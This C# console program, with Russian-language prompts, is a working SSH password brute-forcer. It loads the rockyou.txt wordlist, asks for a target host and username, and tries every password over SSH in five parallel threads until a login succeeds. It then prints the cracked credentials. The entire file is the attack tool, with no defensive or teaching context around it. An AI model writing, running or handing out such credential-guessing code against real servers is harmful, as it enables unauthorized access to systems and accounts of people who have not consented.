using System;
using Renci.SshNet;
using System.Text;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Threading;
using System.ComponentModel.Design;
using System.Security.Cryptography.X509Certificates;
using System.IO.Pipelines;

class Program
{
    static async Task Main()
    {

        string filePath = "rockyou.txt";

        if (!File.Exists(filePath))
        {
            Console.WriteLine("Файл словаря не найден.");
            return;
        }

        
        List<string> dictionary = File.ReadAllLines(filePath).ToList();

        Console.Clear();
        Console.BackgroundColor = ConsoleColor.Blue;
        Console.ForegroundColor = ConsoleColor.White;
        Console.Write("Введите IP адрес или домен: ");
        string host = Console.ReadLine();

        Console.Write("Введите имя пользователя: ");
        string username = Console.ReadLine();

        int maxThreads = 5;
        var semaphore = new SemaphoreSlim(maxThreads);
        bool found = false;
        var tasks = new List<Task>();

        foreach (string password in dictionary)
        {
            Console.WriteLine(password);
            if (found)
                break;
            
            if (string.IsNullOrWhiteSpace(password))
                continue;
            
            await semaphore.WaitAsync();

            var task = Task.Run(() =>
            {
                
                try
                {
                    
                    if (found)
                        return;
                    
                    using (var client = new SshClient(host, username, password))
                    {
                        client.Connect();
                        if (client.IsConnected && !found)
                        {
                            found = true;                            
                            client.Disconnect();
                            Thread.Sleep(1000);
                            Console.BackgroundColor = ConsoleColor.Green;
                            Console.WriteLine("\nПодключение успешно!");
                            Console.WriteLine($"\nIP адрес или домен:{host}");
                            Console.WriteLine($"\nИмя пользователя:{username}");
                            Console.WriteLine($"\nПароль:{password}");
                        }
                        else
                        {
                            Console.WriteLine("Не удалось подключиться.");
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Console.WriteLine("Ошибка: " + ex.Message);
                }
                finally
                {
                    semaphore.Release();
                }  
            });
            tasks.Add(task);
        }

        await Task.WhenAll(tasks);

        Console.BackgroundColor = ConsoleColor.Blue;
        while (true) // Бесконечный цикл, пока не будет выполнен выход или переход
        {
            Console.WriteLine("\nНажмите 1 чтобы вернуться или 2 для выхода.");
            
            ConsoleKeyInfo keyInfo = Console.ReadKey(true);

            if (keyInfo.Key == ConsoleKey.D1 || keyInfo.Key == ConsoleKey.NumPad1)
            {
                Console.ResetColor();
                Console.Clear();
                Main();
                break;
            }
            else if (keyInfo.Key == ConsoleKey.D2 || keyInfo.Key == ConsoleKey.NumPad2)
            {
                Console.ResetColor();
                Console.Clear();
                Console.BackgroundColor = ConsoleColor.Magenta;
                Console.Write("\nВыход");
                Thread.Sleep(500);
                Console.Write(".");
                Thread.Sleep(500);
                Console.Write(".");
                Thread.Sleep(500);
                Console.Write(".");
                Thread.Sleep(1000);
                Console.ResetColor();
                Console.Clear();
                Environment.Exit(0);
            }
            else
            {
                Console.ResetColor();
                Console.Clear();
                Console.BackgroundColor = ConsoleColor.Blue;
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("нажата неверная клавиша! Попробуйте еще раз.");
            }
        }
        Console.BackgroundColor = ConsoleColor.Black;
    }
}   